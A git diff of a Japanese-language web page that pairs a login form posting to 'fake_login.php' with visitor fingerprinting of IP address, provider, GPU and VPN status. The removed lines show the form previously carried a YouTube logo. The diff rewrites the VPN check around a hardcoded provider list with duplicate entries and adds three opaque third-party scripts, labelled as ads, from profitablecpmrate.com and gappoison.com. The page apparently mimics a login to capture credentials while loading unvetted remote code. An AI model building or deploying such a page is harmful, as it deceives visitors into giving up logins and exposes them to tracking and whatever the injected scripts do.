@@ -3,13 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>システム情報とVPNチェック</title>
+  <title>VPNプロバイダーとIP情報の検出</title>
   <link rel="stylesheet" href="styles.css">
+
+  <!-- 広告のスクリプト読み込み -->
+  <script async src="//pl25082341.profitablecpmrate.com/aa/3e/93/aa3e9339a9b40453e2e60b8ab027c4d4.js"></script>
+  <script async src="//pl25082392.profitablecpmrate.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
+  <script async src="//gappoison.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
 </head>
 <body>
   <div class="login-container">
     <div class="login-box">
-      <img class="youtube-logo" src="//github.com/ZeraitoX/website/blob/main/youtube-logo.png" alt="YouTube Logo">
       <h2>ログイン</h2>
       <form action="fake_login.php" method="POST">
         <div class="textbox">
@@ -45,10 +49,25 @@
         <p>GPU情報: <span id="gpu">取得中...</span></p>
         <button onclick="getSystemInfo()" class="btn">システム情報を取得</button>
       </div>
+
     </div>
   </div>
 
   <script>
+    // VPNプロバイダーリストの拡充
+    const vpnProviders = [
+      "ExpressVPN", "NordVPN", "CyberGhost", "IPVanish", "Private Internet Access",
+      "Windscribe", "Surfshark", "ProtonVPN", "TunnelBear", "HMA VPN",
+      "つくばVPN", "VyprVPN", "Mullvad", "AtlasVPN", "PureVPN",
+      "Hide.me", "PrivateVPN", "SaferVPN", "AirVPN", "ZenMate",
+      "Ivacy VPN", "CactusVPN", "FastestVPN", "GooseVPN", "Norton VPN",
+      "Windscribe VPN", "AtlasVPN", "Unlocator", "IPGARD VPN", "Torguard",
+      "Speedify", "VPN Unlimited", "BolehVPN", "StrongVPN", "TorGuard",
+      "SurfEasy VPN", "HideMyAss", "PureVPN", "LeVPN", "NordLayer",
+      "Tunnelblick", "IPredator", "NoBorders", "Keezel", "CyberGhost VPN",
+      "ExpressVPN", "ProtonVPN", "Private Internet Access"
+    ];
+
     // IP アドレス取得関数
     async function getIPAddress() {
       try {
@@ -79,15 +98,12 @@
     // プロバイダー情報を取得する関数
     async function getProviderInfo() {
       try {
-        // プロキシを通してCORS制限を回避
-        const providerResponse = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("http://ip-api.com/json/"));
+        const providerResponse = await fetch("https://ipinfo.io/json");
         const providerData = await providerResponse.json();
         
-        // ip-apiのJSONレスポンスをパース
-        const ipData = JSON.parse(providerData.contents);
-
-        // プロバイダー情報を表示
-        document.getElementById("provider").textContent = ipData.org || "取得失敗";
+        // IPからプロバイダーを抽出
+        const provider = providerData.org || "取得失敗";
+        document.getElementById("provider").textContent = provider;
       } catch (error) {
         console.error("プロバイダー情報の取得中にエラー:", error);
         document.getElementById("provider").textContent = "取得失敗";
@@ -97,15 +113,11 @@
     // VPN状態をチェックする関数
     async function checkVpnStatus() {
       try {
-        // プロキシを通してCORS制限を回避
-        const providerResponse = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("http://ip-api.com/json/"));
+        const providerResponse = await fetch("https://ipinfo.io/json");
         const providerData = await providerResponse.json();
-        
-        // ip-apiのJSONレスポンスをパース
-        const ipData = JSON.parse(providerData.contents);
 
         // VPN使用確認
-        const vpnStatus = detectVpn(ipData);
+        const vpnStatus = detectVpn(providerData);
         document.getElementById("vpn-status").textContent = vpnStatus ? "接続中" : "未接続";
       } catch (error) {
         console.error("VPN状態の確認中にエラー:", error);
@@ -115,33 +127,10 @@
 
     // VPN判定ロジック
     function detectVpn(data) {
-      // もしプロバイダー情報（org）がVPN関連を含んでいればVPN接続とみなす
-      if (data && data.org && (data.org.toLowerCase().includes("vpn") || data.org.toLowerCase().includes("cloud"))) {
-        return true;
+      // IP情報をもとにVPNかどうかを判定
+      if (data && data.org) {
+        return vpnProviders.some(provider => data.org.includes(provider));
       }
-
-      // 日本国内のIP範囲をVPNとして検知
-      const japanIpRanges = [
-        "133.0.0.0", "150.0.0.0", "210.0.0.0", // 日本のIPレンジ（例: 133.0.0.0/8, 150.0.0.0/8）
-        "2400:2400::", "2400:2600::" // IPv6日本IPレンジ（例）
-      ];
-
-      // IPv4のIPアドレス範囲で日本のIPかどうかを判定
-      if (data && data.query) {
-        const ipAddress = data.query;
-        for (let range of japanIpRanges) {
-          if (ipAddress.startsWith(range)) {
-            return true;
-          }
-        }
-      }
-
-      // または、IPの国情報でVPNを判定
-      if (data && data.country && data.country === "JP") {
-        return true; // 日本国内からのアクセスもVPNと見なす
-      }
-
-      // その他のチェック方法を追加可能（例: IPアドレス範囲に基づく判定など）
       return false;
     }
 
